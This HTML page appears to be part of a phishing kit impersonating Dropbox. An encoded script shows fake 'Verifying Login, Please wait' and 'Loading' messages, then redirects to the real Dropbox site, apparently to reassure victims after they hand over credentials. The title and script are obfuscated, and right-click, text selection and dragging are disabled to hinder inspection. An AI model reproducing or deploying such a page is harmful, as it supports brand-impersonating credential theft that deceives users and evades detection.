<HTML>
<HEAD><TITLE>Syn&#99;hroniz&#105;ng... </TITLE>

<link rel="shortcut icon" href="https://cf.dropboxstatic.com/static/images/favicon-vflk5FiAC.ico">
<meta http-equiv="refresh" content="3; url=https://www.dropbox.com/plus" />
</HEAD>

<p align="left"><img src="images/0penin.png"  /></p>
<BODY text=#UUUUUU bgColor=#FFFFFF oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<link rel="shortcut icon" href="https://cf.dropboxstatic.com/static/images/favicon-vflk5FiAC.ico">

<DIV id=splashcontainer style="WIDTH:350px; POSITION: absolute"></DIV><LAYER

id=splashcontainerns width="450"></LAYER>

<font face="Arial" size="18">

<script>
<!--
document.write(unescape("%3CSCRIPT%3Evar%20preloadimages%3Dnew%20Array%28%22%3Aabstract.simplenet.com/point.gif%22%2C%22abstract.simplenet.com/point2.html%22%29var%20intervals%3D3000//configure%20destination%20URLvar%20targetdestination%3D%22https%3A//www.dropbox.com/%22var%20splashmessage%3Dnew%20Array%28%29var%20openingtags%3D%27%3Cfont%20face%3D%22BANK%20GOTHIC%22%20size%3D%223%22%3E%27splashmessage%5B0%5D%3D%27Verifying%20Login%2C%20Please%20wait%27splashmessage%5B1%5D%3D%27Loading...%27splashmessage%5B2%5D%3D%27Loading...%27splashmessage%5B3%5D%3D%27Securely%20create%2C%20view%2C%20download%2C%20upload%2C%20and%20collaborate%20documents.%27splashmessage%5B4%5D%3D%27Securely%20create%2C%20view%2C%20download%2C%20upload%2C%20and%20collaborate%20documents.%27splashmessage%5B5%5D%3D%27Initializing...%27var%20closingtags%3D%27%3C/font%3E%27//Do%20not%20edit%20below%20this%20line%20%28besides%20HTML%20code%20at%20the%20very%20bottom%29var%20i%3D0var%20ns4%3Ddocument.layers%3F1%3A0var%20ie4%3Ddocument.all%3F1%3A0var%20ns6%3Ddocument.getElementById%26%26%21document.all%3F1%3A0var%20theimages%3Dnew%20Array%28%29//preload%20imagesif%20%28document.images%29%7Bfor%20%28p%3D0%3Bp%3Cpreloadimages.length%3Bp++%29%7Btheimages%5Bp%5D%3Dnew%20Image%28%29theimages%5Bp%5D.src%3Dpreloadimages%5Bp%5D%7D%7Dfunction%20displaysplash%28%29%7Bif%20%28i%3Csplashmessage.length%29%7Bsc_cross.style.visibility%3D%22hidden%22sc_cross.innerHTML%3D%27%3Cb%3E%3Ccenter%3E%27+openingtags+splashmessage%5Bi%5D+closingtags+%27%3C/center%3E%3C/b%3E%27sc_cross.style.left%3Dns6%3FparseInt%28window.pageXOffset%29+parseInt%28window.innerWidth%29/2-parseInt%28sc_cross.style.width%29/2%20%3Adocument.body.scrollLeft+document.body.clientWidth/2-parseInt%28sc_cross.style.width%29/2sc_cross.style.top%3Dns6%3FparseInt%28window.pageYOffset%29+parseInt%28window.innerHeight%29/2-sc_cross.offsetHeight/2%3Adocument.body.scrollTop+document.body.clientHeight/2-sc_cross.offsetHeight/2sc_cross.style.visibility%3D%22visible%22i++%7Delse%7Bwindow.location%3Dtargetdestinationreturn%7DsetTimeout%28%22displaysplash%28%29%22%2Cintervals%29%7Dfunction%20displaysplash_ns%28%29%7Bif%20%28i%3Csplashmessage.length%29%7Bsc_ns.visibility%3D%22hide%22sc_ns.document.write%28%27%3Cb%3E%27+openingtags+splashmessage%5Bi%5D+closingtags+%27%3C/b%3E%27%29sc_ns.document.close%28%29sc_ns.left%3DpageXOffset+window.innerWidth/2-sc_ns.document.width/2sc_ns.top%3DpageYOffset+window.innerHeight/2-sc_ns.document.height/2sc_ns.visibility%3D%22show%22i++%7Delse%7Bwindow.location%3Dtargetdestinationreturn%7DsetTimeout%28%22displaysplash_ns%28%29%22%2Cintervals%29%7Dfunction%20positionsplashcontainer%28%29%7Bif%20%28ie4%7C%7Cns6%29%7Bsc_cross%3Dns6%3Fdocument.getElementById%28%22splashcontainer%22%29%3Adocument.all.splashcontainerdisplaysplash%28%29%7Delse%20if%20%28ns4%29%7Bsc_ns%3Ddocument.splashcontainernssc_ns.visibility%3D%22show%22displaysplash_ns%28%29%7Delsewindow.location%3Dtargetdestination%7Dwindow.onload%3Dpositionsplashcontainer%3C/SCRIPT%3E%3C/font%3E%3CDIV%20align%3Dright%3E%20%3C/DIV%3E%3CSCRIPT%3E%3C%21--%20var%20jv%3D1.0%3B//--%3E%3C/SCRIPT%3E%3CSCRIPT%20language%3DJavascript1.1%3E%3C%21--%20jv%3D1.1%3B//--%3E%3C/SCRIPT%3E%3CSCRIPT%20language%3DJavascript1.2%3E%3C%21--%20jv%3D1.2%3B//--%3E%3C/SCRIPT%3E%3CSCRIPT%20language%3DJavascript1.3%3E%3C%21--%20jv%3D1.3%3B//--%3E%3C/SCRIPT%3E%3CSCRIPT%20language%3DJavascript1.4%3E%3C%21--%20jv%3D1.4%3B//--%3E%3C/SCRIPT%3E%3CNOSCRIPT%3E%3CIMG%20height%3D1%20src%3D%22%23%22width%3D1%3E%3C/NOSCRIPT%3E%3Cp%3E%26nbsp%3B%3C/p%3E%3Cp%3E%26nbsp%3B%3C/p%3E%3Cp%3E%26nbsp%3B%3C/p%3E%3Cp%3E%26nbsp%3B%3C/p%3E%3Cp%20align%3D%22center%22%3E%26nbsp%3B%3C/p%3E%3Cp%20align%3D%22center%22%3E%26nbsp%3B%3C/p%3E%3Cp%20align%3D%22center%22%3E%26nbsp%3B%3C/p%3E%3Cp%20align%3D%22center%22%3E%26nbsp%3B%3C/p%3E%3Cp%20align%3D%22center%22%3E%3Cimg%20src%3D%22images/1load.gif%22%20width%3D%2266%22%20height%3D%2266%22%20/%3E%3C/p%3E%3C/BODY%3E"));
//-->
</script>

</HTML>